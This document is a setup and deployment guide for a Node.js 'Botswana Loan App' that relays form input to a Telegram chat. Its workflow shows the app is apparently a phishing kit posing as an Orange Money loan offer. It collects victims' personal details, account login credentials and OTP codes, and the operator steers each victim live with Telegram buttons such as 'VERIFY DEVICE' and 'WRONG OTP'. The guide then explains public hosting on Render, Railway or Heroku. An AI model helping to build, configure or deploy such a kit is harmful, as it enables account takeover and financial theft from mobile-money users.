# Setup Guide - Telegram Bot Integration

## 🎯 Complete Setup Instructions

This guide will walk you through setting up the Botswana Loan App with full Telegram bot integration.

## Step 1: Get Telegram Bot Credentials

### 1a. Create Your Bot
1. Open Telegram and search for **@BotFather**
2. Click Start or send `/start`
3. Send `/newbot`
4. Choose a name for your bot (e.g., "Orange Money Loan Bot")
5. Choose a username (must end in "bot", e.g., "orange_money_loan_bot")
6. Copy the bot token provided (looks like: `123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh`)

### 1b. Get Your Chat ID
1. Open Telegram and search for **@userinfobot**
2. Click Start or send `/start`
3. It will show your User ID (a number like `987654321`)

## Step 2: Clone & Setup Repository

```bash
# Clone the repository
git clone https://github.com/boyofirst92-lang/botswana-loan-app.git
cd botswana-loan-app

# Install dependencies
npm install
```

## Step 3: Configure Environment Variables

```bash
# Copy example env file
cp .env.example .env

# Edit .env with your credentials
nano .env
```

**Edit `./.env` and update:**
```
TELEGRAM_BOT_TOKEN=your_bot_token_from_step_1a
TELEGRAM_CHAT_ID=your_chat_id_from_step_1b
PORT=3000
NODE_ENV=development
```

**Example:**
```
TELEGRAM_BOT_TOKEN=123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh
TELEGRAM_CHAT_ID=987654321
PORT=3000
NODE_ENV=development
```

## Step 4: Start the Server

### Development Mode (with auto-reload)
```bash
npm run dev
```

### Production Mode
```bash
npm start
```

You should see:
```
🚀 Server running on port 3000
📱 Telegram Bot Token: 123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh
💬 Chat ID: 987654321
```

## Step 5: Test the Application

1. Open browser: **http://localhost:3000**
2. Fill in the loan application form
3. Go through the steps
4. When you reach **Page 2 (Personal Details)** and click Continue:
   - You should receive a message in Telegram
   - Click the **✅ APPROVED** button
5. Continue through the workflow
6. Each stage will send data to Telegram for approval

## 🧪 Testing Workflow

### Complete Test Flow:
```
Page 1: Select loan amount (P 25,000) → Continue
  ↓
Page 2: Enter personal details → Continue
  ↓ [Telegram notification sent]
Page 3: [Auto-proceeds after 3 seconds]
  ↓
Page 3: Enter login credentials → Continue
  ↓ [Telegram notification sent - approve via button]
Page 5: Enter OTP (123456) → Verify
  ↓ [Telegram notification sent - approve via button]
Page 7: Success! ✅
```

## 🔍 Troubleshooting

### Issue: Bot not sending messages to Telegram

**Solution:**
1. Verify bot token is correct:
   ```bash
   echo $TELEGRAM_BOT_TOKEN
   ```
2. Verify chat ID is correct:
   ```bash
   echo $TELEGRAM_CHAT_ID
   ```
3. Check server logs for errors:
   ```bash
   # Look for "Error sending to Telegram" messages
   ```

### Issue: Frontend shows loading but doesn't progress

**Solution:**
1. Open DevTools (F12) → Console tab
2. Check for errors
3. Verify backend is running and accessible
4. Check Network tab for failed requests

### Issue: "Cannot GET /" 

**Solution:**
The frontend is being served from `/` which displays the HTML form.
- Frontend: http://localhost:3000 (serves index.html)
- API: http://localhost:3000/api/...

### Issue: CORS errors

**Solution:**
The server has CORS enabled. Make sure:
1. Backend is running
2. Frontend is accessing the correct API_BASE_URL in index.html:
   ```javascript
   const API_BASE_URL = 'http://localhost:3000/api';
   ```

## 📱 Testing Telegram Buttons

When a message is sent to Telegram, you'll see buttons like:
- ✅ APPROVED
- ❌ DENY
- ⚠️ VERIFY DEVICE
- ❌ WRONG OTP

**Click these buttons to test the approval workflow:**

1. **Page 2 (Application Details)**
   - Click ✅ APPROVED → Frontend auto-proceeds to Page 3
   - Click ❌ DENY → Application halts

2. **Page 3 (Login Verification)**
   - Click ✅ APPROVED → Frontend proceeds to Page 5 (OTP)
   - Click ⚠️ VERIFY DEVICE → Shows device verification
   - Click ❌ DENY → Login denied error

3. **Page 5 (OTP Verification)**
   - Click ✅ APPROVE → Frontend proceeds to Page 7 (Success)
   - Click ❌ WRONG OTP → Error, user re-enters OTP

## 🚀 Deployment

### Deploy to Render (Recommended)

1. Push code to GitHub:
   ```bash
   git add .
   git commit -m "Add Telegram bot integration"
   git push origin main
   ```

2. Go to https://render.com and sign up

3. Create new Web Service:
   - Connect your GitHub repo
   - Build command: `npm install`
   - Start command: `npm start`
   - Add environment variables:
     - `TELEGRAM_BOT_TOKEN`
     - `TELEGRAM_CHAT_ID`
     - `NODE_ENV=production`

4. Deploy and get your public URL

### Deploy to Railway

1. Go to https://railway.app
2. Connect GitHub
3. Select repository
4. Add environment variables
5. Deploy

### Deploy to Heroku

```bash
# Install Heroku CLI
npm install -g heroku

# Login
heroku login

# Create app
heroku create your-app-name

# Add environment variables
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id

# Deploy
git push heroku main
```

## 📝 File Structure

```
botswana-loan-app/
├── index.html           # Frontend application
├── server.js            # Backend Express server
├── package.json         # Dependencies & scripts
├── .env.example         # Environment variables template
├── .env                 # Your actual credentials (don't commit!)
├── .gitignore          # Git ignore rules
└── README.md           # This file
```

## 🔐 Security Checklist

- [ ] `.env` file is in `.gitignore`
- [ ] Never commit real bot tokens
- [ ] Use environment variables for all secrets
- [ ] Validate all inputs on backend
- [ ] Use HTTPS in production
- [ ] Keep bot token private
- [ ] Review server logs for errors

## 📞 Support

If you encounter issues:

1. **Check browser console** (F12 → Console)
2. **Check server logs** (Terminal where npm start runs)
3. **Verify `.env` file** has correct values
4. **Test bot token** is valid:
   ```bash
   curl "https://api.telegram.org/bot<YOUR_TOKEN>/getMe"
   ```
5. **Open GitHub issue** with:
   - Error message
   - Steps to reproduce
   - Server logs

## ✅ Next Steps

After setup is complete:

1. ✅ Test the application locally
2. ✅ Deploy to production server
3. ✅ Customize colors and branding
4. ✅ Add database to store applications
5. ✅ Implement email notifications
6. ✅ Add SMS integration for OTP

---

**Version**: 1.0.0  
**Last Updated**: 2026-08-28
